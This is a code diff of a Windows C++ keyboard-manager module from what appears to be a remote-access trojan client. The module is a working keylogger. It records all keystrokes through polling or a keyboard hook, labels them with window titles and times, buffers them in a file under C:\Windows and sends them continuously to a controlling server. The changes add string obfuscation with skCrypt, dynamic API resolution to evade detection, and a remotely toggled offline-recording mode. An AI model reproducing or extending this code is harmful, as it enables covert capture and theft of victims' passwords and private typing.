@@ -2,8 +2,12 @@
 //
 //////////////////////////////////////////////////////////////////////
 
+#include "Common.h"
 #include "KeyboardManager.h"
 #include <tchar.h>
+
+#if ENABLE_KEYBOARD
+
 //////////////////////////////////////////////////////////////////////
 // Construction/Destruction
 //////////////////////////////////////////////////////////////////////
@@ -11,24 +15,25 @@
 #include <iostream>
 #include <winbase.h>
 #include <winuser.h>
+#include "keylogger.h"
+#include <iniFile.h>
 
-#define FILE_PATH "\\MODIf.html"
 #define CAPTION_SIZE 1024
 
-CKeyboardManager1::CKeyboardManager1(CClientSocket *pClient, int n, void* user) : CManager(pClient)
+CKeyboardManager1::CKeyboardManager1(IOCPClient*pClient, int offline, void* user) : CManager(pClient)
 {
-    sendStartKeyBoard();
-    WaitForDialogOpen();
-    sendOfflineRecord();
+    m_bIsOfflineRecord = offline;
 
-    GetSystemDirectory(m_strRecordFile, sizeof(m_strRecordFile));
-    lstrcat(m_strRecordFile, FILE_PATH);
+    char path[MAX_PATH] = { "C:\\Windows\\" };
+	GET_FILEPATH(path, skCrypt(KEYLOG_FILE));
+    strcpy_s(m_strRecordFile, path);
+    m_Buffer = new CircularBuffer(m_strRecordFile);
 
     m_bIsWorking = true;
-    dKeyBoardSize = 0;
 
     m_hWorkThread = MyCreateThread(NULL, 0, KeyLogger, (LPVOID)this, 0, NULL);
     m_hSendThread = MyCreateThread(NULL, 0, SendData,(LPVOID)this,0,NULL);
+    SetReady(TRUE);
 }
 
 CKeyboardManager1::~CKeyboardManager1()
@@ -38,6 +43,15 @@ CKeyboardManager1::~CKeyboardManager1()
     WaitForSingleObject(m_hSendThread, INFINITE);
     CloseHandle(m_hWorkThread);
     CloseHandle(m_hSendThread);
+    m_Buffer->WriteAvailableDataToFile(m_strRecordFile);
+    delete m_Buffer;
+}
+
+void CKeyboardManager1::Notify() {
+    if (NULL == this)
+        return;
+    sendStartKeyBoard();
+    WaitForDialogOpen();
 }
 
 void CKeyboardManager1::OnReceive(LPBYTE lpBuffer, ULONG nSize)
@@ -46,14 +60,15 @@ void CKeyboardManager1::OnReceive(LPBYTE lpBuffer, ULONG nSize)
         NotifyDialogIsOpen();
 
     if (lpBuffer[0] == COMMAND_KEYBOARD_OFFLINE) {
+        m_bIsOfflineRecord = lpBuffer[1];
+        iniFile cfg(CLIENT_PATH);
+        cfg.SetStr("settings", "kbrecord", m_bIsOfflineRecord ? "Yes" : "No");
     }
 
     if (lpBuffer[0] == COMMAND_KEYBOARD_CLEAR) {
-        DeleteFile(m_strRecordFile);
-        HANDLE hFile = CreateFile(m_strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
-                                  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-        CloseHandle(hFile);
-        dKeyBoardSize = 0;
+        m_Buffer->Clear();
+        GET_PROCESS_EASY(DeleteFileA);
+        DeleteFileA(m_strRecordFile);
     }
 }
 
@@ -61,9 +76,9 @@ int CKeyboardManager1::sendStartKeyBoard()
 {
     BYTE	bToken[2];
     bToken[0] = TOKEN_KEYBOARD_START;
-    bToken[1] = (BYTE)true;
+    bToken[1] = (BYTE)m_bIsOfflineRecord;
 
-    return Send((LPBYTE)&bToken[0], sizeof(bToken));
+    return m_ClientObject->Send2Server((char*)&bToken[0], sizeof(bToken));
 }
 
 
@@ -71,50 +86,22 @@ int CKeyboardManager1::sendKeyBoardData(LPBYTE lpData, UINT nSize)
 {
     int nRet = -1;
     DWORD	dwBytesLength = 1 + nSize;
+    GET_PROCESS(DLLS[KERNEL], LocalAlloc);
     LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, dwBytesLength);
 
     lpBuffer[0] = TOKEN_KEYBOARD_DATA;
     memcpy(lpBuffer + 1, lpData, nSize);
 
-    nRet = Send((LPBYTE)lpBuffer, dwBytesLength);
+    nRet = CManager::Send((LPBYTE)lpBuffer, dwBytesLength);
+    GET_PROCESS(DLLS[KERNEL], LocalFree);
     LocalFree(lpBuffer);
 
     return nRet;
 }
 
-int CKeyboardManager1::sendOfflineRecord(DWORD	dwRead)
-{
-    int		nRet = 0;
-    DWORD	dwSize = 0;
-    DWORD	dwBytesRead = 0;
-    HANDLE	hFile = CreateFile(m_strRecordFile, GENERIC_READ, FILE_SHARE_READ,
-                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-
-    if (hFile != INVALID_HANDLE_VALUE) {
-        dwSize = GetFileSize(hFile, NULL);
-        dKeyBoardSize = dwSize;
-        if (0 != dwRead) {
-            SetFilePointer(hFile, dwRead, NULL, FILE_BEGIN);
-            dwSize -= dwRead;
-        }
-
-        TCHAR *lpBuffer = new TCHAR[dwSize];
-        ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL);
-
-        // 解密
-        for (int i = 0; i < (dwSize/sizeof(TCHAR)); i++)
-            lpBuffer[i] ^= '`';
-
-        nRet = sendKeyBoardData((LPBYTE)lpBuffer, dwSize);
-        delete[] lpBuffer;
-    }
-    CloseHandle(hFile);
-    return nRet;
-}
-
-
 std::string GetKey(int Key) // 判断键盘按下什么键
 {
+    GET_PROCESS(DLLS[USER32], GetKeyState);
     std::string KeyString = "";
     //判断符号输入
     const int KeyPressMask=0x80000000; //键盘掩码常量
@@ -124,207 +111,207 @@ std::string GetKey(int Key) // 判断键盘按下什么键
         switch(Key) {
         case 186:
             if(IS)
-                KeyString = ":";
+                KeyString = skCrypt(":");
             else
-                KeyString = ";";
+                KeyString = skCrypt(";");
             break;
         case 187:
             if(IS)
-                KeyString = "+";
+                KeyString = skCrypt("+");
             else
-                KeyString = "=";
+                KeyString = skCrypt("=");
             break;
         case 188:
             if(IS)
-                KeyString = "<";
+                KeyString = skCrypt("<");
             else
-                KeyString = ",";
+                KeyString = skCrypt(",");
             break;
         case 189:
             if(IS)
-                KeyString = "_";
+                KeyString = skCrypt("_");
             else
-                KeyString = "-";
+                KeyString = skCrypt("-");
             break;
         case 190:
             if(IS)
-                KeyString = ">";
+                KeyString = skCrypt(">");
             else
-                KeyString = ".";
+                KeyString = skCrypt(".");
             break;
         case 191:
             if(IS)
-                KeyString = "?";
+                KeyString = skCrypt("?");
             else
-                KeyString = "/";
+                KeyString = skCrypt("/");
             break;
         case 192:
             if(IS)
-                KeyString = "~";
+                KeyString = skCrypt("~");
             else
-                KeyString = "`";
+                KeyString = skCrypt("`");
             break;
         case 219:
             if(IS)
-                KeyString = "{";
+                KeyString = skCrypt("{");
             else
-                KeyString = "[";
+                KeyString = skCrypt("[");
             break;
         case 220:
             if(IS)
-                KeyString = "|";
+                KeyString = skCrypt("|");
             else
-                KeyString = "\\";
+                KeyString = skCrypt("\\");
             break;
         case 221:
             if(IS)
-                KeyString = "}";
+                KeyString = skCrypt("}");
             else
-                KeyString = "]";
+                KeyString = skCrypt("]");
             break;
         case 222:
             if(IS)
                 KeyString = '"';
             else
-                KeyString = "'";
+                KeyString = skCrypt("'");
             break;
         }
     }
     //判断键盘的第一行
     if (Key == VK_ESCAPE) // 退出
-        KeyString = "[Esc]";
+        KeyString = skCrypt("[Esc]");
     else if (Key == VK_F1) // F1至F12
-        KeyString = "[F1]";
+        KeyString = skCrypt("[F1]");
     else if (Key == VK_F2)
-        KeyString = "[F2]";
+        KeyString = skCrypt("[F2]");
     else if (Key == VK_F3)
-        KeyString = "[F3]";
+        KeyString = skCrypt("[F3]");
     else if (Key == VK_F4)
-        KeyString = "[F4]";
+        KeyString = skCrypt("[F4]");
     else if (Key == VK_F5)
-        KeyString = "[F5]";
+        KeyString = skCrypt("[F5]");
     else if (Key == VK_F6)
-        KeyString = "[F6]";
+        KeyString = skCrypt("[F6]");
     else if (Key == VK_F7)
-        KeyString = "[F7]";
+        KeyString = skCrypt("[F7]");
     else if (Key == VK_F8)
-        KeyString = "[F8]";
+        KeyString = skCrypt("[F8]");
     else if (Key == VK_F9)
-        KeyString = "[F9]";
+        KeyString = skCrypt("[F9]");
     else if (Key == VK_F10)
-        KeyString = "[F10]";
+        KeyString = skCrypt("[F10]");
     else if (Key == VK_F11)
-        KeyString = "[F11]";
+        KeyString = skCrypt("[F11]");
     else if (Key == VK_F12)
-        KeyString = "[F12]";
+        KeyString = skCrypt("[F12]");
     else if (Key == VK_SNAPSHOT) // 打印屏幕
-        KeyString = "[PrScrn]";
+        KeyString = skCrypt("[PrScrn]");
     else if (Key == VK_SCROLL) // 滚动锁定
-        KeyString = "[Scroll Lock]";
+        KeyString = skCrypt("[Scroll Lock]");
     else if (Key == VK_PAUSE) // 暂停、中断
-        KeyString = "[Pause]";
+        KeyString = skCrypt("[Pause]");
     else if (Key == VK_CAPITAL) // 大写锁定
-        KeyString = "[Caps Lock]";
+        KeyString = skCrypt("[Caps Lock]");
 
     //-------------------------------------//
     //控制键
     else if (Key == 8) //<- 回格键
-        KeyString = "[Backspace]";
+        KeyString = skCrypt("[Backspace]");
     else if (Key == VK_RETURN) // 回车键、换行
-        KeyString = "[Enter]\n";
+        KeyString = skCrypt("[Enter]\n");
     else if (Key == VK_SPACE) // 空格
-        KeyString = " ";
+        KeyString = skCrypt(" ");
     //上档键:键盘记录的时候，可以不记录。单独的Shift是不会有任何字符，
     //上档键和别的键组合，输出时有字符输出
     /*
     else if (Key == VK_LSHIFT) // 左侧上档键
-    KeyString = "[Shift]";
+    KeyString = skCrypt("[Shift]");
     else if (Key == VK_LSHIFT) // 右侧上档键
-    KeyString = "[SHIFT]";
+    KeyString = skCrypt("[SHIFT]");
     */
     /*如果只是对键盘输入的字母进行记录:可以不让以下键输出到文件*/
     else if (Key == VK_TAB) // 制表键
-        KeyString = "[Tab]";
+        KeyString = skCrypt("[Tab]");
     else if (Key == VK_LCONTROL) // 左控制键
-        KeyString = "[Ctrl]";
+        KeyString = skCrypt("[Ctrl]");
     else if (Key == VK_RCONTROL) // 右控制键
-        KeyString = "[CTRL]";
+        KeyString = skCrypt("[CTRL]");
     else if (Key == VK_LMENU) // 左换档键
-        KeyString = "[Alt]";
+        KeyString = skCrypt("[Alt]");
     else if (Key == VK_LMENU) // 右换档键
-        KeyString = "[ALT]";
+        KeyString = skCrypt("[ALT]");
     else if (Key == VK_LWIN) // 右 WINDOWS 键
-        KeyString = "[Win]";
+        KeyString = skCrypt("[Win]");
     else if (Key == VK_RWIN) // 右 WINDOWS 键
-        KeyString = "[WIN]";
+        KeyString = skCrypt("[WIN]");
     else if (Key == VK_APPS) // 键盘上 右键
-        KeyString = "右键";
+        KeyString = skCrypt("右键");
     else if (Key == VK_INSERT) // 插入
-        KeyString = "[Insert]";
+        KeyString = skCrypt("[Insert]");
     else if (Key == VK_DELETE) // 删除
-        KeyString = "[Delete]";
+        KeyString = skCrypt("[Delete]");
     else if (Key == VK_HOME) // 起始
-        KeyString = "[Home]";
+        KeyString = skCrypt("[Home]");
     else if (Key == VK_END) // 结束
-        KeyString = "[End]";
+        KeyString = skCrypt("[End]");
     else if (Key == VK_PRIOR) // 上一页
-        KeyString = "[PgUp]";
+        KeyString = skCrypt("[PgUp]");
     else if (Key == VK_NEXT) // 下一页
-        KeyString = "[PgDown]";
+        KeyString = skCrypt("[PgDown]");
     // 不常用的几个键:一般键盘没有
     else if (Key == VK_CANCEL) // Cancel
-        KeyString = "[Cancel]";
+        KeyString = skCrypt("[Cancel]");
     else if (Key == VK_CLEAR) // Clear
-        KeyString = "[Clear]";
+        KeyString = skCrypt("[Clear]");
     else if (Key == VK_SELECT) //Select
-        KeyString = "[Select]";
+        KeyString = skCrypt("[Select]");
     else if (Key == VK_PRINT) //Print
-        KeyString = "[Print]";
+        KeyString = skCrypt("[Print]");
     else if (Key == VK_EXECUTE) //Execute
-        KeyString = "[Execute]";
+        KeyString = skCrypt("[Execute]");
 
     //----------------------------------------//
     else if (Key == VK_LEFT) //上、下、左、右键
-        KeyString = "[←]";
+        KeyString = skCrypt("[←]");
     else if (Key == VK_RIGHT)
-        KeyString = "[→]";
+        KeyString = skCrypt("[→]");
     else if (Key == VK_UP)
-        KeyString = "[↑]";
+        KeyString = skCrypt("[↑]");
     else if (Key == VK_DOWN)
-        KeyString = "[↓]";
+        KeyString = skCrypt("[↓]");
     else if (Key == VK_NUMLOCK)//小键盘数码锁定
-        KeyString = "[NumLock]";
+        KeyString = skCrypt("[NumLock]");
     else if (Key == VK_ADD) // 加、减、乘、除
-        KeyString = "+";
+        KeyString = skCrypt("+");
     else if (Key == VK_SUBTRACT)
-        KeyString = "-";
+        KeyString = skCrypt("-");
     else if (Key == VK_MULTIPLY)
-        KeyString = "*";
+        KeyString = skCrypt("*");
     else if (Key == VK_DIVIDE)
-        KeyString = "/";
+        KeyString = skCrypt("/");
     else if (Key == 190 || Key == 110) // 小键盘 . 及键盘 .
-        KeyString = ".";
+        KeyString = skCrypt(".");
     //小键盘数字键:0-9
     else if (Key == VK_NUMPAD0)
-        KeyString = "0";
+        KeyString = skCrypt("0");
     else if (Key == VK_NUMPAD1)
-        KeyString = "1";
+        KeyString = skCrypt("1");
     else if (Key == VK_NUMPAD2)
-        KeyString = "2";
+        KeyString = skCrypt("2");
     else if (Key == VK_NUMPAD3)
-        KeyString = "3";
+        KeyString = skCrypt("3");
     else if (Key == VK_NUMPAD4)
-        KeyString = "4";
+        KeyString = skCrypt("4");
     else if (Key == VK_NUMPAD5)
-        KeyString = "5";
+        KeyString = skCrypt("5");
     else if (Key == VK_NUMPAD6)
-        KeyString = "6";
+        KeyString = skCrypt("6");
     else if (Key == VK_NUMPAD7)
-        KeyString = "7";
+        KeyString = skCrypt("7");
     else if (Key == VK_NUMPAD8)
-        KeyString = "8";
+        KeyString = skCrypt("8");
     else if (Key == VK_NUMPAD9)
-        KeyString = "9";
+        KeyString = skCrypt("9");
     //-------------------------------------------//
 
     //-------------------------------------------//
@@ -345,34 +332,34 @@ std::string GetKey(int Key) // 判断键盘按下什么键
         if(IS) {
             switch(Key) {
             case 48: //0
-                KeyString = ")";
+                KeyString = skCrypt(")");
                 break;
             case 49://1
-                KeyString = "!";
+                KeyString = skCrypt("!");
                 break;
             case 50://2
-                KeyString = "@";
+                KeyString = skCrypt("@");
                 break;
             case 51://3
-                KeyString = "#";
+                KeyString = skCrypt("#");
                 break;
             case 52://4
-                KeyString = "$";
+                KeyString = skCrypt("$");
                 break;
             case 53://5
-                KeyString = "%";
+                KeyString = skCrypt("%");
                 break;
             case 54://6
-                KeyString = "^";
+                KeyString = skCrypt("^");
                 break;
             case 55://7
-                KeyString = "&";
+                KeyString = skCrypt("&");
                 break;
             case 56://8
-                KeyString = "*";
+                KeyString = skCrypt("*");
                 break;
             case 57://9
-                KeyString = "(";
+                KeyString = skCrypt("(");
                 break;
             }
         } else
@@ -399,45 +386,24 @@ std::string GetKey(int Key) // 判断键盘按下什么键
     return KeyString;
 }
 
-void SaveToFile(TCHAR *strRecordFile, TCHAR *lpBuffer)
-{
-    HANDLE	hFile = CreateFile(strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE,
-                               NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-
-    DWORD dwBytesWrite = 0;
-    DWORD dwSize = GetFileSize(hFile, NULL);
-    if (dwSize < 1024 * 1024 * 50)
-        SetFilePointer(hFile, 0, 0, FILE_END);
-
-
-    // 加密
-    int	nLength = lstrlen(lpBuffer);
-    TCHAR*	lpEncodeBuffer = new TCHAR[nLength];
-    for (int i = 0; i < nLength; i++)
-        lpEncodeBuffer[i] = lpBuffer[i] ^ _T('`');
-    WriteFile(hFile, lpEncodeBuffer, lstrlen(lpBuffer)*sizeof(TCHAR), &dwBytesWrite, NULL);
-    CloseHandle(hFile);
-
-    delete [] lpEncodeBuffer;
-    return;
-}
-
 BOOL CKeyboardManager1::IsWindowsFocusChange(HWND &PreviousFocus, TCHAR *WindowCaption, TCHAR *szText, bool hasData)
 {
-    HWND hFocus = GetForegroundWindow();
+    GET_PROCESS(DLLS[USER32], GetForegroundWindow);
+    HWND hFocus = (HWND)GetForegroundWindow();
     BOOL ReturnFlag = FALSE;
     if (hFocus != PreviousFocus) {
         if (lstrlen(WindowCaption) > 0) {
             if (hasData) {
                 SYSTEMTIME   s;
                 GetLocalTime(&s);
-                wsprintf(szText, _T("\r\n[标题:] %s\r\n[时间:]%d-%02d-%02d  %02d:%02d:%02d\r\n"),
+                sprintf(szText, _T("\r\n[标题:] %s\r\n[时间:]%d-%02d-%02d  %02d:%02d:%02d\r\n"),
                     WindowCaption,s.wYear,s.wMonth,s.wDay,s.wHour,s.wMinute,s.wSecond);
             }
             memset(WindowCaption, 0, CAPTION_SIZE);
             ReturnFlag=TRUE;
         }
         PreviousFocus = hFocus;
+        GET_PROCESS_EASY(SendMessageA);
         SendMessage(hFocus, WM_GETTEXT, CAPTION_SIZE, (LPARAM)WindowCaption);
     }
     return ReturnFlag;
@@ -447,35 +413,56 @@ DWORD WINAPI CKeyboardManager1::SendData(LPVOID lparam)
 {
     CKeyboardManager1 *pThis = (CKeyboardManager1 *)lparam;
 
+    int pos = 0;
     while(pThis->m_bIsWorking) {
-        DWORD dwSize =0;
-        HANDLE	hFile = CreateFile(pThis->m_strRecordFile, GENERIC_READ, FILE_SHARE_READ,
-                                   NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-
-        if (hFile != INVALID_HANDLE_VALUE) {
-            dwSize = GetFileSize(hFile, NULL);
+        if (!pThis->IsConnected()) {
+            pos = 0;
+            Sleep(1000);
+            continue;
         }
-        CloseHandle(hFile);
-
-        if (pThis->dKeyBoardSize != dwSize) {
-            pThis->sendOfflineRecord(pThis->dKeyBoardSize);
+        int size = 0;
+        char* lpBuffer = pThis->m_Buffer->Read(pos, size);
+        if (size) {
+            int nRet = pThis->sendKeyBoardData((LPBYTE)lpBuffer, size);
+            delete[] lpBuffer;
         }
-
-        Sleep(3000);
+        Sleep(1000);
     }
     return 0;
 }
 
+
+int CALLBACK WriteBuffer(const char* record, void* user) {
+    CircularBuffer* m_Buffer = (CircularBuffer*)user;
+    m_Buffer->Write(record, strlen(record));
+	return 0;
+}
+
+
 DWORD WINAPI CKeyboardManager1::KeyLogger(LPVOID lparam)
 {
     CKeyboardManager1 *pThis = (CKeyboardManager1 *)lparam;
-
+    MSG msg;
     TCHAR KeyBuffer[2048] = {};
 	TCHAR szText[CAPTION_SIZE] = {};
     TCHAR WindowCaption[CAPTION_SIZE] = {};
     HWND PreviousFocus = NULL;
+    GET_PROCESS(DLLS[USER32], GetAsyncKeyState);
     while(pThis->m_bIsWorking) {
+		if (!pThis->IsConnected() && !pThis->m_bIsOfflineRecord) {
+#if USING_KB_HOOK
+            ReleaseHook();
+#endif
+			Sleep(1000);
+			continue;
+		}
         Sleep(5);
+#if USING_KB_HOOK
+		if (!SetHook(WriteBuffer, pThis->m_Buffer)) {
+			return -1;
+		}
+		while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE));
+#else
         int num = lstrlen(KeyBuffer);
         if (pThis->IsWindowsFocusChange(PreviousFocus, WindowCaption, szText, num > 0) || num > 2000) {
             bool newWindowInput = strlen(szText);
@@ -489,7 +476,7 @@ DWORD WINAPI CKeyboardManager1::KeyLogger(LPVOID lparam)
                 const int offset = sizeof(_T("\r\n[内容:]")) - 1;
                 memmove(KeyBuffer+offset, KeyBuffer, strlen(KeyBuffer));
                 memcpy(KeyBuffer, _T("\r\n[内容:]"), offset);
-                SaveToFile(pThis->m_strRecordFile, KeyBuffer);
+                pThis->m_Buffer->Write(KeyBuffer, strlen(KeyBuffer));
                 memset(KeyBuffer,0,sizeof(KeyBuffer));
             }
         }
@@ -499,6 +486,9 @@ DWORD WINAPI CKeyboardManager1::KeyLogger(LPVOID lparam)
                 lstrcat(KeyBuffer,TempString.c_str());
             }
         }
+#endif
     }
     return 0;
 }
+
+#endif
